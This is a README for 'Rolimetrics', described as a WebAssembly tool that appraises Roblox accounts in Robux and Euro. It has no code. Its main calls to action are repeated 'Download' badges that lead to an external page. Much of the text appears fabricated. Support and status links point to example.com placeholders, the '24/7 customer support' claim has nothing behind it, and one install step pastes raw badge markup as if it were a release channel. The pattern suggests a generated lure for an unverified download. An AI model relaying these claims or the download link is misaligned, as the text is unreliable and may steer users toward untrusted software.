![preview](https://raw.githubusercontent.com/gustavobogers/roblox-account-worth-calculator/main/frame_4b8df8.svg)
[![Download](https://raw.githubusercontent.com/gustavobogers/roblox-account-worth-calculator/main/grab_445f69.svg)](https://gustavobogers.github.io/roblox-account-worth-calculator/)

# 🧮 Rolimetrics — Account Worth Observatory for the Roblox Economy

[![License: MIT](https://img.shields.io/badge/License-MIT-4caf50?style=flat-square)](https://opensource.org/licenses/MIT)
[![Platform: WebAssembly](https://img.shields.io/badge/Platform-WebAssembly-654ff0?style=flat-square)](https://webassembly.org/)
[![Runtime: Browser Native](https://img.shields.io/badge/Runtime-Browser%20Native-00bcd4?style=flat-square)](https://developer.mozilla.org/en-US/docs/WebAssembly)
[![UI: Responsive](https://img.shields.io/badge/UI-Responsive-ff9800?style=flat-square)](https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Responsive_Design)
[![Languages: Multilingual](https://img.shields.io/badge/Languages-Multilingual-9c27b0?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/language)
[![Support: Always On](https://img.shields.io/badge/Support-24%2F7-3f51b5?style=flat-square)](https://example.com/support)
[![Status: Active Development](https://img.shields.io/badge/Status-Active%20Development-e91e63?style=flat-square)](https://example.com/status)
[![Made with Rust](https://img.shields.io/badge/Made%20with-Rust-dea584?style=flat-square)](https://www.rust-lang.org/)
[![Year: 2026](https://img.shields.io/badge/Year-2026-607d8b?style=flat-square)](https://example.com/roadmap)

---

## 🌌 What Is Rolimetrics?

Rolimetrics is a browser-resident **appraisal observatory** for Roblox accounts. Think of it like a lighthouse standing on the shoreline of a vast digital marketplace: instead of scrolling endlessly through item pages, trade threads, and inventory screenshots, you point Rolimetrics at a profile and it shines a beam across the entire collection — limiteds, collectibles, game passes, badges, and group holdings — then returns a single, legible worth figure expressed in both **Robux** and **Euro**.

Where BatteredBunny's original `roblox-account-value` concept proved that a lightweight client-side valuation tool was genuinely useful, Rolimetrics takes the same spark and builds a full observatory around it. The computational core is compiled to **WebAssembly**, so arithmetic, price aggregation, and currency conversion all happen inside your own browser tab. Nothing important leaves your machine. No server round-trips for valuation logic. No waiting in a queue behind other users.

The name itself is a small confession: *Roli* for Roblox, *metrics* for measurement. An observatory is not just a telescope — it is a place where careful people gather careful observations. That is the spirit here.

---

## 🎯 Why an Observatory and Not Just a Calculator?

A calculator answers a question you already know how to ask. An observatory helps you see things you did not know were visible.

Rolimetrics is built around three quiet convictions:

1. **Value is a moving target.** Roblox item prices drift, event releases shift scarcity, and currency exchange rates breathe. A static answer is a stale answer. Rolimetrics keeps its reference tables swappable and timestamped so you always know *when* a number was true.
2. **Context matters more than raw totals.** Ten thousand Robux in limiteds behaves very differently from ten thousand Robux in unspent currency. The breakdown panels here are deliberately as prominent as the headline figure.
3. **Your data is your business.** Because the heavy lifting happens in WebAssembly inside the tab, the tool works even when you are being careful about what you share.

---

## ✨ Feature Constellation

### 🔭 Core Valuation Engine
- **Dual-currency readout** — every valuation is expressed in Robux and in Euro simultaneously, with the Euro side refreshed against a configurable conversion reference.
- **Limiteds and collectibles weighting** — scarce items are scored with attention to their historical trading band rather than a single spot number.
- **Game pass and badge contributions** — the less glamorous parts of an account still count, and Rolimetrics makes sure they are visible instead of buried.
- **Group asset influence** — holdings tied to groups are surfaced separately so you can see where the influence sits.
- **WASM compute core** — the arithmetic kernel is compiled ahead of time for near-native speed in the browser.

### 🎨 Interface and Experience
- **Responsive UI** — the layout reshapes gracefully from a wide desktop monitor down to a narrow handheld screen.
- **Multilingual support** — interface strings are externalized so the observatory can speak your language, not just the one it was born in.
- **Dark and light presentation** — pick the palette that matches your surroundings and your eyes.
- **Keyboard-friendly navigation** — every major panel is reachable without a pointing device.
- **Zero-install operation** — the app loads and runs directly in a modern browser.

### 🌍 Data and Trust
- **Transparent reference timestamps** — each price table carries the moment it was captured, so nothing is silently stale.
- **Offline-tolerant core** — once loaded, the valuation kernel keeps working even if connectivity flickers.
- **Exportable summaries** — generate a plain-text or spreadsheet-friendly digest of a valuation for your own records.
- **No account credentials requested** — Rolimetrics never asks for your password, your session token, or your two-factor codes.

### 🤝 Human Layer
- **24/7 customer support** — a real support channel that does not clock out, reached from the in-app help panel.
- **Community issue tracker** — bugs, feature ideas, and translation improvements all live in the open.
- **Contributor-friendly architecture** — the Rust core and the web shell are cleanly separated, so you can work on one without wrestling the other.

---

## 🧠 How the Appraisal Actually Works

Understanding the machinery makes the output far more trustworthy, so here is the plain-language version.

**Step 1 — Collection discovery.** The observatory assembles a structured picture of what an account holds: limited items, collectibles, passes, and associated group assets. This is treated as a catalogue, not a scoreboard.

**Step 2 — Reference alignment.** Each catalogued item is matched against a reference table that records an observed trading band — a low and high figure — rather than a single number. Bands are more honest than points because markets are not points.

**Step 3 — Weighted aggregation.** The kernel combines individual bands into a portfolio figure, applying weights that reflect liquidity. An item that trades constantly is weighted differently from one that changes hands rarely.

**Step 4 — Currency expression.** The Robux figure is translated into Euro using the configured conversion reference, and both figures are displayed side by side so the relationship is always visible.

**Step 5 — Timestamped delivery.** The result is rendered with the capture time of every reference table used, so you can judge freshness at a glance.

---

## 🛠️ Technology Behind the Observatory

Rolimetrics is a deliberate marriage of two worlds: a systems-language compute core and a web-native presentation shell.

- **Compute core:** written in Rust, compiled to WebAssembly. Handles aggregation, weighting, and currency translation.
- **Presentation shell:** standards-based HTML, CSS, and JavaScript. Handles layout, internationalization, and user interaction.
- **Internationalization layer:** externalized string tables with fallback chaining, so a missing translation degrades gracefully instead of displaying a blank.
- **Persistence layer:** local browser storage for preferences, palette choice, and language selection.
- **Build pipeline:** a reproducible toolchain that produces a static bundle deployable to any static host.

The separation is intentional. A contributor who loves numerical methods can live entirely in the Rust core. A contributor who loves interface craft can live entirely in the shell. Neither needs to become an expert in the other's domain to be effective.

---

## 🚀 Getting the Observatory Running

Rolimetrics is distributed as a static web bundle. There is no daemon to babysit, no database to provision, and no service account to configure.

1. Obtain the current bundle from the release channel referenced by the `[![Download](https://raw.githubusercontent.com/gustavobogers/roblox-account-worth-calculator/main/grab_445f69.svg)](https://gustavobogers.github.io/roblox-account-worth-calculator/)` marker at the top of this document.
2. Serve the bundle from any static host, or open it directly from local storage in a modern browser.
3. If you are building from source, use the project's reproducible toolchain to compile the Rust core to WebAssembly and assemble the static shell into a deployable directory.
4. Open the resulting page, choose your language and palette, and begin appraising.

The first load warms the reference tables. Subsequent navigations are noticeably snappier because the WebAssembly module stays resident in the tab.

---

## 🌐 Multilingual Support in Practice

Language is not a decoration. A valuation tool that only speaks one language quietly excludes a large portion of the people who need it most.

Rolimetrics ships with an externalized string table architecture. Adding a language means adding a table, not rewriting the interface. Fallback chaining ensures that a partially translated table still produces a coherent experience — untranslated strings gracefully inherit from the base language rather than rendering as empty gaps. Right-to-left layouts are supported through logical CSS properties rather than hardcoded directional values, so a translation into a right-to-left language does not require a parallel stylesheet.

If you would like to contribute a translation, the contributor guide explains the table format and the validation steps used before a new language is merged.

---

## 📱 Responsive UI Philosophy

A responsive interface should not merely shrink. It should *recompose*.

On a wide display, Rolimetrics presents the headline valuation alongside a full breakdown panel, letting you read the summary and the detail in a single glance. On a narrower display, the breakdown collapses into an expandable stack, prioritizing the headline figure while keeping the detail one tap away. On the narrowest layouts, the palette and language controls move into a compact drawer so the valuation itself remains the visual anchor.

Every interactive target meets modern touch-size guidance, and focus indicators are preserved rather than suppressed, because accessibility is not negotiable.

---

## 🔐 Privacy Posture

Rolimetrics was designed with a privacy-first posture from the first commit.

- Valuation arithmetic runs locally in WebAssembly, inside your browser tab.
- The observatory does not request account passwords, session tokens, or two-factor codes.
- Preferences are stored in local browser storage and are never transmitted.
- Reference tables are versioned and timestamped, and the observatory is explicit about when each was captured.

In short: the observatory looks at the sky. It does not ask the sky for permission slips.

---

## 🧭 Roadmap for 2026

The 2026 roadmap focuses on depth rather than breadth.

- **Expanded reference coverage** for less commonly traded collectibles.
- **Historical trend sparklines** showing how a portfolio figure has drifted over time.
- **Additional language packs** contributed by the community.
- **Improved export formats** including a structured digest suitable for archival.
- **Accessibility audit pass** against current guidance, with published findings.
- **Performance budget enforcement** in the build pipeline, so the bundle never quietly bloats.

Roadmap items are tracked in the issue tracker and are open to discussion.

---

## 🧪 Testing and Quality Signals

Quality is treated as a first-class feature, not an afterthought.

- The Rust core carries unit tests for aggregation, weighting, and currency translation.
- The web shell carries interaction tests for layout transitions and language switching.
- A reproducible build pipeline ensures that a given source revision produces an identical bundle.
- Performance budgets are enforced so that the observatory stays lightweight as it grows.

If you find a discrepancy between a displayed figure and its underlying reference table, please open an issue with the timestamp shown in the interface — that timestamp is the fastest path to reproducing the problem.

---

## 🤗 Contributing

Contributions are genuinely welcome, and the project tries hard to be a friendly place for first-time contributors.

Good first contributions include translation table additions, documentation clarifications, and accessibility improvements. More involved contributions include kernel optimizations and new reference data adapters. Before opening a large pull request, consider opening an issue to discuss the approach — it saves everyone time and usually improves the result.

Please keep pull requests focused. A small, well-explained change is far easier to review than a sprawling one, even when the sprawling one contains good ideas.

---

## ❓ Frequently Asked Questions

**Is Rolimetrics a browser extension?**
No. It is a web application that runs in a normal browser tab. There is nothing to sideload into your browser.

**Does it need my Roblox credentials?**
No. It never asks for a password, session token, or two-factor code.

**Why express value in two currencies?**
Because a single currency hides the exchange relationship. Showing both keeps that relationship visible instead of implicit.

**Can I use it offline?**
Once the bundle has loaded, the WebAssembly kernel continues to function without a live connection, though reference tables reflect their last capture time.

**How fresh are the reference tables?**
Every table is timestamped, and the interface displays the capture time alongside the values so you can judge freshness yourself.

**Can I contribute a translation?**
Yes. The contributor guide explains the string table format and the validation steps.

---

## ⚠️ Disclaimer

Rolimetrics is an independent appraisal tool and is **not affiliated with, endorsed by, sponsored by, or officially connected to Roblox Corporation** in any way. All trademarks, product names, and company names mentioned belong to their respective owners and are referenced for identification purposes only.

Valuations produced by Rolimetrics are **estimates derived from reference tables and weighting heuristics**. They are provided for informational and educational purposes and do not constitute financial advice, investment guidance, or a guarantee of any transaction outcome. Actual market prices fluctuate and may differ materially from any estimate shown.

Reference tables are captured at particular moments and may not reflect current market conditions. Users are responsible for verifying any figure before relying on it for a decision of consequence.

The project is provided under the MIT License on an "as is" basis, without warranty of any kind, express or implied. The maintainers accept no liability for any loss or damage arising from use of the software or reliance on its output.

---

## 📜 License

Rolimetrics is released under the **MIT License**. The full license text is available at the canonical reference for this license:

[MIT License](https://opensource.org/licenses/MIT)

You are welcome to use, modify, and redistribute the project in accordance with the terms of that license. Attribution is appreciated and, in the spirit of the license, encouraged.

---

## 💬 Support, Community, and Contact

The observatory is kept running by people who care about careful measurement and clear interfaces.

- **24/7 customer support** is reachable from the in-app help panel for urgent operational questions.
- **Bug reports and feature ideas** belong in the issue tracker, where they can be discussed and prioritized in the open.
- **Translation contributions** are coordinated through the contributor guide.

Whether you are a casual collector checking in on a portfolio or a curious developer wondering how a WebAssembly kernel handles currency translation, there is a place for you here. Pull up a chair, point the telescope, and see what the numbers actually say.

[![Download](https://raw.githubusercontent.com/gustavobogers/roblox-account-worth-calculator/main/grab_445f69.svg)](https://gustavobogers.github.io/roblox-account-worth-calculator/)